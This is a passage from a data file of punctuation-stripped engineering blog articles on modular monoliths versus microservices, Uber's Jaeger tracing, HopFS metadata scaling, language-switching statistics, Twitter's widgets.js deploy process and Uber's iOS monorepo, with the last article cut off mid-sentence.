embracing any help we can get from the programming language and development tooling to enforce the principles of modularity   In Java  for example  there are several module systems that can help in structuring an application  OSGi is the most well known one  but with the release of Java 9 a native module system is added to the Java platform itself  Modules are now part of the language and platform as a first class construct  Java modules can express dependencies on other modules  and publicly export interfaces while strongly encapsulating implementation classes  Even the Java platform itself  an enormous codebase  has been modularized using the new Java module system  You can learn more about modular development with Java 9 in my forthcoming book  Java 9 Modularity  now available in early release   Other languages offer similar mechanisms  For instance  JavaScript got a module system as of ES2015  Before that  Node js already offered a non standard module system for JavaScript back ends  However  as a dynamic language  JavaScript has weaker support for enforcing interfaces  types  and encapsulation between modules  You can consider using TypeScript on top of JavaScript to get back this advantage again  Microsoft s  Net Framework does have strong typing like Java  but it doesn t have a direct equivalent to Java s upcoming module system in terms of strong encapsulation and explicit dependencies between assemblies  Still  a good modular architecture can be achieved by using Inversion of Control patterns which are standardized in  Net Core and by creating logically related assemblies  Even C   is considering the addition of a module system in a future revision  Many languages are gaining appreciation for modularization  which is in itself a striking development   When you make a conscious effort to use the modularity features of your development platform  you can achieve the same modularity benefits that we ascribed to microservices earlier  Essentially  the better the module system  the more help you get during development  Different teams can work on different parts  where only the well defined interfaces are touch points between the teams  Still  at deployment time the modules come together in a single deployment unit  This way you can prevent the substantial complexity and costs associated with moving to microservices development and management  True  this means you can t build each module on a different tech stack  But is your organization really ready for that anyway   Designing modules  Creating good modules requires the same design rigor as creating good microservices  A module should model  part of  a single bounded context of the domain  Choosing microservice boundaries is an architecturally significant decision with costly ramifications when done wrong  Module boundaries in a modular application are easier to change  Refactoring across modules is typically supported by the type system and the compiler  Redrawing microservice boundaries involves a lot of inter personal communication to not let things blow up at run time  And be honest  how often do you get your boundaries right the first time  or even the second   In many ways  modules in statically typed languages offer better constructs for well defined interfaces  Calling a method through a typed interface exposed by another module is much more robust against changes than calling a REST endpoint on another microservice  REST JSON is ubiquitous  but it is not the hallmark of well typed interoperability in the absence of  compiler checked  schemas  Add in the fact that traversing the network including  de serialization still isn t free  and the picture becomes even bleaker  What s more  many module systems allow you to express your dependencies on other modules  When these dependencies are violated  the module system will not allow it  Dependencies between microservices only materialize at run time  leading to hard to debug systems   Modules are natural units for code ownership as well  Teams can be responsible for one or more modules in the system  The only thing shared with other teams is the public API of their modules  At run time  there s less isolation between modules in comparison with microservices  Everything still runs in the same process  after all   There s no reason why a module in a monolith can t own its data just like a good microservice does  Sharing within the modular application then happens through well defined interfaces or messages between modules  not through a shared datastore  The big difference with microservices is that everything happens in process  Eventual consistency concerns should not be underestimated  With modules  eventual consistency can be a deliberate  strategic choice  Or  you can just  logically  separate data while storing them in the same datastore and still use cross domain transactions for the time being  For microservices  there is no choice  eventual consistency is a given and you need to adapt   When are microservices right for your organization   So when should you turn to microservices  Until now  we ve mainly focused on tackling complexity through modularity  For that  both microservices and modular applications will do  But there are different challenges besides the ones addressed so far   When your organization is at the scale of Google or Netflix  it makes complete sense to embrace microservices  You have the capacity to build your own platform and toolkits  and the number of engineers prohibits any reasonable monolithic approach  But most organizations don t operate at this scale  Even if you think your organization will become a billion dollar unicorn one day  starting out with a modularized monolith won t do much harm   Another good reason to spin up separate microservices is if different services are inherently better suited to different technology stacks  Then again  you must have the scale to attract talent across these disparate stacks and keep those platforms up and running   Microservices also enable independent deployment of different parts of the system  something that is harder  or even impossible  in most modular platforms  Isolated deployments add to the resilience and fault tolerance of the system  Furthermore  the scaling characteristics may be different for each microservice  Different microservices can be deployed to matching hardware  The modularized monolith can be scaled horizontally as well  but you scale out all modules together  That may not always work out for the best  though in practice  you can get quite far with this approach   Conclusion  As always  the best option is finding a middle ground  There s a place for both approaches  and which is best really depends on the environment  organisation and the application itself  Why not start with a modular application  You can always choose to move to microservices later  Then  instead of having to surgically untangle your monolith  you have sensible module boundaries cut out already  It s not even an exclusive choice  you can also use modules to structure microservices internally  The question then becomes  why do microservices have to be  micro    Even if you do depart from a single modularized application  your services don t have to be tiny to be maintainable  Again  applying the principles of modularity within services allows them to scale in complexity beyond what you d normally ascribe to microservices  There s a place for both modules and microservices in this picture  Real cost savings can be achieved by reducing the number of services in your architecture  Modules can help structure and scale services just as they can help structure a single monolithic application   If you re after the benefits of modularity  make sure you don t trick yourself into a microservices only mindset  Explore the in process modularity features or frameworks of your favorite technology stack  You ll get support to enforce modular design  instead of having to just rely on conventions to avoid spaghetti code  Then  make a deliberate choice whether you want to incur the complexity penalty of microservices  Sometimes you just have to  but often  you can find a better way forward,"[1377 773 278 1159 60 1126 234 548 695 1405 520]"
1379,training-dataset/engineering/1421.txt,engineering,Evolving Distributed Tracing at Uber Engineeringby Yuri Shkuro  Distributed tracing is quickly becoming a must have component in the tools that organizations use to monitor their complex  microservice based architectures  At Uber Engineering  our open source distributed tracing system Jaeger saw large scale internal adoption throughout 2016  integrated into hundreds of microservices and now recording thousands of traces every second  As we start the new year  here is the story of how we got here  from investigating off the shelf solutions like Zipkin  to why we switched from pull to push architecture  and how distributed tracing will continue to evolve in 2017   From Monolith to Microservices  As Uber s business has grown exponentially  so has our software architecture complexity  A little over a year ago  in fall 2015  we had around five hundred microservices  As of early 2017  we have over two thousand  This is in part due to the increasing number of business features user facing ones like UberEATS and UberRUSH as well as internal functions like fraud detection  data mining  and maps processing  The other reason complexity increased was a move away from large monolithic applications to a distributed microservices architecture   As it often happens  moving into a microservices ecosystem brings its own challenges  Among them is the loss of visibility into the system  and the complex interactions now occurring between services  Engineers at Uber know that our technology has a direct impact on people s livelihoods  The reliability of the system is paramount  yet it is not possible without observability  Traditional monitoring tools such as metrics and distributed logging still have their place  but they often fail to provide visibility across services  This is where distributed tracing thrives   Tracing Uber s Beginnings  The first widely used tracing system at Uber was called Merckx  named after the fastest cyclist in the world during his time  Merckx quickly answered complex queries about Uber s monolithic Python backend  It made queries like  find me requests where the user was logged in and the request took more than two seconds and only certain databases were used and a transaction was held open for more than 500 ms  possible  The profiling data was organized into a tree of blocks  with each block representing a certain operation or a remote call  similar to the notion of  span  in the OpenTracing API  Users could run ad hoc queries against the data stream in Kafka using command line tools  They could also use a web UI to view predefined digests that summarized the high level behavior of API endpoints and Celery tasks   Merckx instrumentation was automatically applied to a number of infrastructure libraries in Python  including HTTP clients and servers  SQL queries  Redis calls  and even JSON serialization  The instrumentation recorded certain performance metrics and metadata about each operation  such as the URL for an HTTP call  or SQL query for database calls  It also captured information like how long database transactions have remained open  and which database shards and replicas were accessed   The major shortcoming with Merckx was its design for the days of a monolithic API at Uber  Merckx lacked any concept of distributed context propagation  It recorded SQL queries  Redis calls  and even calls to other services  but there was no way to go more than one level deep  One other interesting Merckx limitation was that many advanced features like database transaction tracking really only worked under uWSGI  since Merckx data was stored in a global  thread local storage  Once Uber started adopting Tornado  an asynchronous application framework for Python services  the thread local storage was unable to represent many concurrent requests running in the same thread on Tornado s IOLoop  We began to realize how important it was to have a solid story for keeping request state around and propagating it correctly  without relying on global variables or global state   Next  Tracing in TChannel  At the beginning of 2015  we started the development of TChannel  a network multiplexing and framing protocol for RPC  One of the design goals of the protocol was to have Dapper style distributed tracing built into the protocol as a first class citizen  Toward that goal  the TChannel protocol specification defined tracing fields as part of the binary format   spanid 8 parentid 8 traceid 8 traceflags 1  field type description spanid int64 that identifies the current span parentid int64 of the previous span traceid int64 assigned by the original requestor traceflags uint8 bit flags field  Tracing fields appear as part of the binary format in TChannel protocol specification   In addition to the protocol specification  we released several open source client libraries that implement the protocol in different languages  One of the design principles for those libraries was to have the notion of a request context that the application was expected to pass through from the server endpoints to the downstream call sites  For example  in tchannel go  the signature to make an outbound call with JSON encoding required the context as the first argument   func  c  Client  Call ctx Context  method string  arg  resp interface    error       The TChannel libraries encouraged application developers to write their code with distributed context propagation in mind   The client libraries had built in support for distributed tracing by marshalling the tracing context between the wire representation and the in memory context object  and by creating tracing spans around service handlers and the outbound calls  Internally  the spans were represented in a format nearly identical to the Zipkin tracing system  including the use of Zipkin specific annotations  such as  cs   Client Send  and  cr   Client Receive   TChannel used a tracing reporter interface to send the collected tracing spans out of process to the tracing system s backend  The libraries came with a default reporter implementation that used TChannel itself and Hyperbahn  the discovery and routing layer  to send the spans in Thrift format to a cluster of collectors   TChannel client libraries got us close to the working distributing tracing system Uber needed  providing the following building blocks   Interprocess propagation of tracing context  in band with the requests  Instrumentation API to record tracing spans  In process propagation of the tracing context  Format and mechanism for reporting tracing data out of process to the tracing backend  The only missing piece was the tracing backend itself  Both the wire format of the tracing context and the default Thrift format used by the reporter have been designed to make it very straightforward to integrate TChannel with a Zipkin backend  However  at the time the only way to send spans to Zipkin was via Scribe  and the only performant data store that Zipkin supported was Cassandra  Back then  we had no direct operational experience for either of those technologies  so we built a prototype backend that combined some custom components with the Zipkin UI to form a complete tracing system   The success of distributed tracing systems at other major tech companies such as Google and Twitter was predicated on the availability of RPC frameworks  Stubby and Finagle respectively  widely used at those companies   Similarly  out of the box tracing capabilities in TChannel were a big step forward  The deployed backend prototype started receiving traces from several dozen services right away  More services were being built using TChannel  but full scale production rollout and widespread adoption were still problematic  The prototype backend and its Riak Solr based storage had some issues scaling up to Uber s traffic  and several query capabilities were missing to properly interoperate with the Zipkin UI  And despite the rapid adoption of TChannel by new services  Uber still had a large number of services not using TChannel for RPC  in fact  most of the services responsible for running the core business functions ran without TChannel  These services were implemented in four major programming languages  Node js  Python  Go  and Java   using a variety of different frameworks for interprocess communication  This heterogeneity of the technology landscape made deploying distributed tracing at Uber a much more difficult task than at places like Google and Twitter   Building Jaeger in New York City  The Uber NYC Engineering organization began in early 2015  with two primary teams  Observability on the infrastructure side and Uber Everything on the product side  including UberEATS and UberRUSH   Since distributed tracing is a form of production monitoring  it was a good fit for Observability   We formed the Distributed Tracing team with two engineers and two objectives  transform the existing prototype into a full scale production system  and make distributed tracing available to and adopted by all Uber microservices  We also needed a code name for the project  Naming things is one of the two hard problems in computer science  so it took us a couple weeks of brainstorming words with the themes of tracing  detectives  and hunting  until we settled on the name Jaeger   y  g r   German for hunter or hunting attendant   The NYC team already had the operational experience of running Cassandra clusters  which was the database directly supported by the Zipkin backend  so we decided to abandon the Riak Solr based prototype  We reimplemented the collectors in Go to accept TChannel traffic and store it in Cassandra in the binary format compatible with Zipkin  This allowed us to use Zipkin web and query services without any modifications  and also provided the missing functionality of searching traces by custom tags  We have also built in a dynamically configurable multiplication factor into each collector to multiply the inbound traffic n times for the purpose of stress testing the backend with production data   The second order of business was to make tracing available to all the existing services that were not using TChannel for RPC  We spent the next few months building client side libraries in Go  Java  Python  and Node js to support instrumentation of arbitrary services  including HTTP based ones  Even though the Zipkin backend was fairly well known and popular  it lacked a good story on the instrumentation side  especially outside of the Java Scala ecosystem  We considered various open source instrumentation libraries  but they were maintained by different people with no guarantee of interoperability on the wire  often with completely different APIs  and most requiring Scribe or Kafka as the transport for reporting spans  We ultimately decided to write our own libraries that would be integration tested for interoperability  support the transport that we needed  and  most importantly  provide a consistent instrumentation API in different languages  All our client libraries have been build to support the OpenTracing API from inception   Another novel feature that we built into the very first versions of the client libraries was the ability to poll the tracing backend for the sampling strategy  When a service receives a request that has no tracing metadata  the tracing instrumentation usually starts a new trace for that request by generating a new random trace ID  However  most production tracing systems  especially those that have to deal with the scale of Uber  do not profile every single trace or record it in storage  Doing so would create a prohibitively large volume of traffic from the services to the tracing backend  possibly orders of magnitude larger than the actual business traffic handled by the services  Instead  most tracing systems sample only a small percentage of traces and only profile and record those sampled traces  The exact algorithm for making a sampling decision is what we call a sampling strategy  Examples of sampling strategies include   Sample everything  This is useful for testing  but expensive in production   A probabilistic approach  where a given trace is sampled randomly with a certain fixed probability   A rate limiting approach  where X number of traces are sampled per time unit  For example  a variant of the leaky bucket algorithm might be used   Most existing Zipkin compatible instrumentation libraries support probabilistic sampling  but they expect the sampling rate to be configured on initialization  Such an approach leads to several serious problems when used at scale   A given service has little insight about the impact of the sampling rate on the overall traffic to the tracing backend  For example  even if the service itself has a moderate Query Per Second  QPS  rate  it could be calling another downstream service that has a very high fanout factor or using extensive instrumentation that results in a lot of tracing spans   At Uber  business traffic exhibits strong daily seasonality  more people take rides during peak hours  A fixed sampling probability might be too low for off peak traffic  yet too high for peak traffic   The polling feature in Jaeger client libraries was designed to address these problems  By moving the decision about the appropriate sampling strategy to the tracing backend  we free service developers from guessing about the appropriate sampling rate  This also allows the backend to dynamically adjust the sampling rates as the traffic patterns change  The diagram below shows the feedback loop from collectors to the client libraries   The first versions of the client libraries still used TChannel to send tracing spans out of process by submitting them directly to collectors  so the libraries depended on Hyperbahn for discovery and routing  This dependency created unnecessary friction for engineers adopting tracing for their services  both on the infrastructure level and on the number of extra libraries they had to pull into the service  potentially creating dependency hell   We addressed that by implementing the jaeger agent sidecar process  deployed to all hosts as an infrastructure component just like the agents collecting metrics  All routing and discovery dependencies were encapsulated in the jaeger agent  and we redesigned the client libraries to report tracing spans to a local UDP port and poll the agent on the loopback interface for the sampling strategies  Only the basic networking libraries are required by the new clients  This architectural change was a step toward our vision of using post trace sampling  buffering traces in memory in the agents   Turnkey Distributed Tracing  The Zipkin UI was the last piece of third party software we had in Jaeger  Having to store spans in Cassandra in Zipkin Thrift format for compatibility with the UI limited our backend and data model  In particular  the Zipkin model did not support two important features available in the OpenTracing standard and our client libraries  a key value logging API and traces represented as more general directed acyclic graphs rather than just trees of spans  We decided to take the plunge  renovate the data model in our backend  and write a new UI  Shown below  the new data model natively supports both key value logging and span references  It also optimizes the volume of data sent out of process by avoiding process tag duplication in every span   We are currently completing the upgrade of the backend pipeline to the new data model and a new  better optimized Cassandra schema  To take advantage of the new data model  we have implemented a new Jaeger query service in Go and a brand new web UI built with React  The initial version of the UI mostly reproduces existing features of the Zipkin UI  but it was architected to be easily extensible with new features and components as well as embeddable into other UIs as a React component itself  For example  a user can select a number of different views to visualize trace results  such as a histogram of trace durations or the service s cumulative time in the trace   As another example  a single trace can be viewed according to specific use cases  The default rendering is a time sequence  other views include a directed acyclic graph or a critical path diagram   By replacing the remaining Zipkin components in our architecture with Jaeger s own components  we position Jaeger to be a turnkey  end to end distributed tracing system   We believe it is crucial that the instrumentation libraries be inherently part of Jaeger  to guarantee both their compatibility with the Jaeger backend and interoperability amongst themselves via continuous integration testing   This guarantee was unavailable in the Zipkin ecosystem   In particular  the interoperability across all supported languages  currently Go  Java  Python  and Node js  and all supported wire transports  currently HTTP and TChannel  is tested as part of every pull request with the help of the crossdock framework  written by the Uber Engineering RPC team  You can find the details of the Jaeger client integration tests in the jaeger client go crossdock repository  At the moment  all Jaeger client libraries are available as open source   We are migrating the backend and the UI code to Github  and plan to have the full Jaeger source code available soon  If you are interested in the progress  watch the main repository  We welcome contributions  and would love to see others give Jaeger a try  While we are pleased with the progress so far  the story of distributed tracing at Uber is still far from finished   Yuri Shkuro is a staff software engineer in the Uber New York City engineering office  and is in all likelihood diligently working on Jaeger and other Uber Engineering open source contributions right now,"[1379 673 778 1300 952 1351 92 1347 1373 281 234]"
1386,training-dataset/engineering/1513.txt,engineering,HopFS  Scaling hierarchical file system metadata using NewSQL databasesHopFS  Scaling hierarchical file system metadata using NewSQL databases  HopFS  Scaling hierarchical file system metadata using NewSQL databases Niazi et al   FAST 2017  If you re working with big data and Hadoop  this one paper could repay your investment in The Morning Paper many times over  ok  The Morning Paper is free   but you do pay with your time to read it   You know that moment when you re working on a code base and someone says  why don t we replace all this complex home grown code and infrastructure with this pre existing solution    That   Here s the big idea   for large HDFS installations  the single node in memory metadata service is the bottleneck  So why not replace the implementation with a NewSQL database and spread the load across multiple nodes  In this instance  MySQL Cluster was used  but that s pluggable  Of course  there will be some important design issues to address  but the authors do a neat job of solving these  I especially like that the paper is grounded in real world workloads from Spotify  and we get some nice insights into the scale of data at Spotify too as a bonus    All very nice  but what difference does HopFS  a drop in replacement  make in the real world  How about   Enabling an order of magnitude larger clusters  Improving cluster throughput by an order of magnitude  16x   37x   Lower latency when using large numbers of concurrent clients  No downtime during failover  Think of the capital and operational costs of having to stand up a second large scale Hadoop cluster because your existing one is capacity or throughput limited  HopFS is a huge win if it eliminates your need to do that   NameNodes in Apache Hadoop vs HopFS  In vanilla Apache Hadoop  HDFS metadata is stored on the heap of a single Java process  the Active NameNode  ANN   The ANN logs changes to journal servers using quorum based replication  The change log is asynchronously replicated to a Standby NameNode  ZooKeeper is used to determine which node is active  and to coordinate failover from the active to the standby namenode  Datanodes connect to both active and standby namenodes   In HDFS the amount of metadata is quite low relative to file data  There is approximately 1 gigabyte of metadata for every petabyte of file system data  Spotify s HDFS cluster has 1600  nodes  storing 60 petabytes of data  but its metadata fits in 140 gigabytes Java Virtual Machine  JVM  heap  The extra heap space is taken by temporary objects  RPC request queues and secondary metadata required for the maintenance of the file system  However  current trends are towards even larger HDFS clusters  Facebook has HDFS clusters with more than 100 petabytes of data   but current JVM garbage collection technology does not permit very large heap sizes  as the application pauses caused by the JVM garbage collector affects the operations of HDFS  As such  JVM garbage collection technology and the monolithic architecture of the HDFS namenode are now the scalability bottlenecks for Hadoop   HopFS is a drop in replacement for HDFS  based on HDFS v2 0 4  Instead of a single in memory process  it provides a scale out metadata service  Multiple stateless namenode processes handle client requests and store data in an external distributed database  MySQL Cluster  References to NDB throughout the paper refer to the Network DataBase storage engine for MySQL Cluster   Partitioning  HDFS metadata contains information on inodes  blocks  replicas  quotas  leases and mappings  dirs to files  files to blocks  blocks to replicas    When metadata is distributed  an application defined partitioning scheme is needed to shard the metadata and a consensus protocol is required to ensure metadata integrity for operations that cross shards   The chosen partition scheme is based on a study of the relative frequency of operations in production deployments  Common file system operations  primary key  batched primary key  and partition pruned index scans  can be implemented using only low cost database operations   File system metadata is stored in tables  with a directory inode represented by a single row in the Inode table  File inodes have more associated metadata  that is stored in a collected of related tables   With the exception of hotspots  HopFS partitions inodes by their parents  inode IDs  resulting in inodes with the same parent inode being stored on the same database shard   A hinting mechanism allows e g   the transaction for listing files in a directory to be initiated on a transaction coordinator on the shard holding the child inodes for the directory   Hotspots are simply inodes that receive a high proportion of file system operations  The root inode is immutable and cached at all namenodes  The immediate children of top level directories receive special treatment to avoid them becoming hotspots   they are pseudo randomly partitioned by hashing the names of the children  By default just the first two levels of the hierarchy receive this treatment   Transactions  HopFS uses transactions for all operations  coupled with row level locking to serialize conflicting inode operations  Taking multiple locks in a transaction can lead to deadlocks and timeouts unless care is take to avoid cycles and upgrade deadlocks   To avoid cycle deadlocks  HopFS reimplemented all inode operations to acquire locks on the metadata in the same total order   Root to leaves  left ordered depth first search   Upgrade deadlocks are prevented by acquiring all locks at the start of the transaction   In HDFS  many inode operations contain read operations followed by write operations on the same metadata  When translated into database operations within the same transaction  this results in deadlocking due to lock upgrades from read to exclusive locks  We have examined all locks acquired by the inode operations  and re implemented them so that all data needed in a transaction is read only once at the start of the transaction at the strongest lock level that could be needed during the transaction  thus preventing lock upgrades   Inode operations proceed in three phases  lock  execute  and update   Operations on large directories  e g  containing millions of inodes  are too large to fit in a single transaction  A subtree operations protocol instead performs such operations incrementally in a series of transactions   We serialize subtree operations by ensuring that all ongoing inode and subtree operations in a subtree complete before a newly requested subtree operation is executed  We implement this serialization property by enforcing the following invariants   1  no new operations access the subtree until the operation completes   2  the subtree is quiesced before the subtree operation starts   3  no orphaned inodes or inconsistencies arise if failures occur   Evaluation  For the evaluation  HopFS used NDB v7 5 3 deployed on 12 nodes configured to run 22 threads each  and with data replication degree 2  HDFS namenode suport was deployed on 5 servers  one active namenode  one standby namenode  and three journal nodes colocated with three ZooKeeper nodes  The benchmark used traces from Spotify s 1600  node cluster containing 60 Petabytes of data  13 million directories  and 218 million files  This cluster runs on average 40 000 jobs a day from a variety of applications   Figure 6  below  shows that  for our industrial workload  using 60 namenodes and 12 NDB nodes  HopsFS can perform 1 25 million operations per second delivering 16 times the throughput of HDFS  As discussed before in medium to large Hadoop clusters 5 to 8 servers are required to provide high availability for HDFS  With equivalent hardware  2 NDB nodes and 3 namenodes   HopsFS delivers  10  higher throughput than HDFS  HopsFS performance increases linearly as more namenodes nodes are added to the system  HDFS reaches a file limit of about 470 million files due to constraints on the JVM heap size  HopFS needs about 1 5 times more memory in aggregate than HDFS to store metadata that is highly available  but it can scale to many more files   A saturation test explored the maximum throughput and scalability of each file system operation   In real deployments  the namenode often receives a deluge of the same file system operation type  for example  a big job that reads large amounts of data will generate a huge number of requests to read files and list directories    In the results below  HopFS  results are displayed as a bar chart of stacked rectangles  each representing the increase in throughput when five new namenodes are added   HopFS outperforms HDFS for all file system operations and has significantly better performance than HDFS for the most common file system operations   When it comes to latency  it is true that HopFS is slower than HDFS for single filesystem operations on unloaded namenodes  But start to scale up the workload and you can quickly see HopFS has the advantage   Large HDFS deployments may have tens of thousands of clients and the end to end latency observed by the clients increases as the file system operations wait in RPC call queues at the namenode  In contrast  HopFS can handle more concurrent clients while keeping operation latencies low   HopFS provides much faster failover with no downtime too   Surely there is some downside to HopFS   Well  yes there is one  HopFS can only process about 30 block reports a second  whereas HDFS does 60  But HopFS doesn t need block reports as often as HDFS does  and with datanodes sending block reports every six hours it can still scale to exabyte sized clusters   The bottom line   HopsFS is an open source  highly available file system that scales out in both capacity and throughput by adding new namenodes and database nodes  HopsFS can store 37 times more metadata than HDFS and for a workload from Spotify HopsFS scales to handle 16 times the throughput of HDFS  HopsFS also has lower average latency for large number of concurrent clients  and no downtime during failover  Our architecture supports a pluggable database storage engine  and other NewSQL databases could be used,"[1386 1336 946 310 500 1403 373 92 699 673 393]"
1392,training-dataset/engineering/1344.txt,engineering,The eigenvector of  Why we moved from language X to language Y    Erik BernhardssonThe eigenvector of  Why we moved from language X to language Y   I was reading yet another blog post titled  Why our team moved from to    I forgot which one  and I started wondering if you can generalize it a bit  Is it possible to generate a N   N contingency table of moving from language X to language Y   Someone should make a N N contingency table of all engineering blog posts titled  Why we moved from  language X  to  language Y      Erik Bernhardsson   fulhack  January 25  2017  So I wrote a script for it  You can query Google from a script and get the number of search results using a tiny snippet  I tried a few different query strings  like move from  language 1  to  language 2   switch to  language 2  from  language 1  and a few more ones  In the end you get a nice N   N contingency table of all languages   Here s where the cool part begins  We can actually treat this as probabilities from switching between languages and say something about what the future language popularities will be  One the key is that the stationary distribution of this process does not depend on the initial distribution   turns out this is basically just the first eigenvector of the matrix  So you really don t have to make any assumptions about what s popular right now   the hypothetical future stationary state is independent of this   We need to make this into a stochastic matrix that describes the probabilities of going from state to state   This is easy   we can interpret the contingency matrix as transition probabilities by just normalizing across each row   this should give a rough approximation of the probability of switching from language to language    Finding the first eigenvector is trivial  we just multiply a vector many times with the matrix and it will converge towards the first eigenvector  By the way  see notes below for a bunch of more discussion on how I did this   Go is the future of programming      Without further ado  here is the top few languages of the stationary distribution   16 41  Go 14 26  C 13 21  Java 11 51  C   9 45  Python  I took the stochastic matrix sorted by the future popularity of the language  as predicted by the first eigenvector    Surprisingly   to me  at least  Go is the big winner here  There s a ton of search results for people moving from X to Go  I m not even sure how I feel about it  I have mixed feelings about Go  but I guess my infallible analysis points to the inevitable conclusion that Go is something worth watching   The C language  which turned 45 years old this year  is doing really well here  I did a bunch of manual searches and in many cases a lot of the results are really people writing about how they optimize certain tight loops by moving code from X to C etc  But is that incorrect  I don t think so  C is the lingua franca of how computer works and if people are still actively moving pieces of code to C then it s here to stay  I seriously think C will be going strong by its 100th birthday in 2072  With my endorsements for C on LinkedIn  I expect recruiters to reach out to me about C opportunities well into the 2050 s  actually taking that back   hopefully C will outlive LinkedIn    Other than that  the analysis pretty much predicts what I would expect  Java is here to stay  Perl is dead  Rust is doing pretty well   Btw  this analysis reminds me of this old tweet  Very interesting graphing showing rate of switch between R and Python for data analysis pic twitter com moYFgrHCBJ   Big Data Borat   BigDataBorat  April 24  2014  Javascript frameworks  I did the same analysis for frontend frameworks   I expected React to come out on top here  but interestingly Vue is doing really well  I m also surprised how well Angular stacks up   anecdotally it seems like a mass exodus away from it   Databases  I started looking at ride sharing apps  deep learning frameworks  and other things  but the data is far more sparse and less reliable  Will keep you posted   Notes caveats,"[1392 641 980 778 794 92 293 1341 214 978 26]"
1393,training-dataset/engineering/619.txt,engineering,How Twitter deploys its widgets JavaScriptDeploys are hard and it can be frustrating to do them  Many bugs manifest themselves during deploys  especially when there are a large number of code changes  Now what if a deploy also goes out to millions of people at once  Here s the story of how my team makes a deploy of that scale safely and with ease   Publishers on the web use a single JavaScript file  widgets js  to embed Twitter content on their website  Embedded Tweets  embedded timelines  and Tweet buttons are powered by the same JavaScript file  making it easy for web publishers to integrate widgets into their websites  We update widgets js weekly  deploying bug fixes and adding features without requiring our publishers to do any work to receive the updates   But to ensure things stay simple for our customers  we need to take on some of the complexity  Specifically  we need to deploy a single  unversioned  well known  static asset which publishers trust to run within their page  This code is executed roughly 300 000 times a second by over a billion visitors every month  We know this is a big responsibility for us and that s why we recently invested in upgrading the widgets js deploy process to catch mistakes early  and avoid negative customer impact   A safe deploy  We began this project by cementing what an ideal deploy would look like  Specifically  we identified three qualities of a safe deploy that we were after   Reversibility   Rollback first  debug later  is our motto  Rollback should be fast  easy  and simple  Ideally  it s a giant red button that can get our heart rates down    Rollback first  debug later  is our motto  Rollback should be fast  easy  and simple  Ideally  it s a giant red button that can get our heart rates down  Incremental release  All code has bugs and deploys have an uncanny way of surfacing them  That s why we wanted the ability to release new code in phases   All code has bugs and deploys have an uncanny way of surfacing them  That s why we wanted the ability to release new code in phases  Visibility  We need to have graphs to show how both versions of widgets js are doing at all times  We also need the ability to drill down by country  browser type  and widget type  These graphs should be real time so we can quickly tell how a deploy is going and take action as necessary   These were the goals we set for ourselves  Now  let s dive into the details of how we accomplished them   How the deploy works  Because widgets js is a well known asset  platform twitter com widgets js   it has no versioning in its file name which makes it harder to control the progress of its deploy  The way we decided to control the release of a new version of this file is by controlling how our domain  platform twitter com  gets resolved at the DNS level  This way  we can set rules to resolve the file to either the new version  or the old version  during the deploy   Deploy architecture  To implement such control over our DNS  we had to configure three components   DNS Management service  This is a service that lets us control how platform twitter com gets resolved to an IP address  We use geographic regions to control the roll out  based on the following three rules  which correspond to each phase of the deploy   Phase 1  5  of traffic from Region A gets IP2 and others get IP1   Phase 2  100  of traffic from Region A gets IP2 and others get IP1  Repeat for increasingly larger regions   Phase 3  100  of all traffic gets IP2  This includes TOR traffic and any requests that we could not identify what region it is coming from   CDN  Content Delivery Network   This is a service that helps serve our static assets in a performant manner  Ours is configured so that if a request is made through IP1 it ll serve the asset from ORIGIN 1  otherwise ORIGIN 2   Origin  A storage service  like Amazon S3  where widgets js is uploaded  CDN asks the origin for the latest version to serve   The default state is that all requests are served by the asset in ORIGIN 1  A deploy starts with uploading a new version of widgets js to ORIGIN 2  Then we start moving traffic to ORIGIN 2 by going from Phase 1 to 3  as described above  If the deploy is successful  we copy assets from ORIGIN 2 to ORIGIN 1 and reset all traffic to ORIGIN 1   Scoring the new deploy process    Our goal was to execute a safe deploy  so let s evaluate how we did  By having 2 origins  we were able to rollback instantly   a rollback here is moving all traffic back to ORIGIN 1 where we have the previous version of widgets js  The geography based deploy gave us a way to incrementally rollout the new version and only move forward if it was safe to do so  Lastly  our client code logs the release version  so we were able to build real time graphs that told us if the deploy was successful or not   A successful deploy looks like this today   Traffic changes of the new and old version during a successful deploy  We have used this deploy process for nearly a year now  and detected several regressions earlier than we would have previously  For example  we recently had a bug in our code where a lazy loaded JavaScript file was incorrectly addressed which resulted in our widgets not rendering completely  But thanks to this deploy process  we quickly saw the impact and were able to address it before it affected customers widely   Next steps  We have big ideas on what we can improve for the next iteration  One thing we have learned is that our DNS rules could be better  We would like Phase 1 to be a small but significant number of users to give us quick insight into critical regressions  In Phase 2  we would like the sample of users to be bigger to catch more subtle bugs that show up only at scale  Matching our phases to these goals requires some tuning of DNS rules which is an area we want to invest going forward   Another area we would like to improve is the total deploy time  With so many moving pieces  our deploy time has increased from a few minutes to a couple of hours  and this is mostly because we have to wait for all intermediate caches to invalidate each time we move traffic from one phase to another   We would also like to add performance metrics in the future  so we can expand our release verification from raw successes failures to deeper performance insights such as render times in different locations around the world   We use external vendors for CDN and DNS management and all the configurations that I describe here at the DNS level use publicly documented APIs that you can use for your deploys today  Overall  we are very happy with how the new deploy process works for us today because it has emboldened us to ship updates more often while still keeping things simple for publishers,"[1393 1010 1225 1336 597 1351 92 1300 61 520 1403]"
1399,training-dataset/engineering/421.txt,engineering,Faster Together  Uber Engineering s iOS Monorepoby Alan Zeino  Over the past few years  Uber has experienced a period of hypergrowth  expanding to service over 550 cities worldwide  To keep up  our mobile team also had to grow  In 2014  we had just over a dozen mobile engineers working on our iOS apps  Today  our mobile team numbers in the hundreds  As a result  our mobile tooling has undergone major changes to meet the demand of this larger and also more dynamic team   At the  Scale conference last September we showcased how Uber Engineering has grown since those early days  Here  we will focus more deeply on why we eventually had to switch to a single mobile monolithic repository  monorepo  at first glance  seemingly in contrast to our monolithic migration to a microservice infrastructure architecture and how this move has changed mobile engineering at Uber for the better   Before the Monorepo  Let s take a step back and examine the state of Uber s iOS development world before the monorepo  On iOS  we relied solely on an open source tool named CocoaPods to construct our applications  CocoaPods is a package manager  dependency resolver  and integration tool all in one  It allows developers to quickly integrate other libraries into their applications without needing to configure complex project settings in Xcode  CocoaPods also resolves dependencies by targeting cycles in dependency graphs that can lead to issues at compile time  Since it is the most popular package manager for Cocoa  many third party frameworks which we depend on were only available via CocoaPods  Moreover  CocoaPods  popularity meant that issues with the tool were typically fixed quickly  or acknowledged swiftly by its team of contributors   While our team and our projects were small  CocoaPods served us well  For Uber s first few years  we built most of our applications with a single shared library and a number of open source libraries  The dependency graphs were usually small  so CocoaPods could resolve our dependencies very quickly and with minimal pain for our developers  It allowed us to focus on building the product   Modularizing the Codebase  By late 2014  the Uber Engineering shared library had become a dumping ground for code that lacked any concrete organization  Because everything was potentially just one 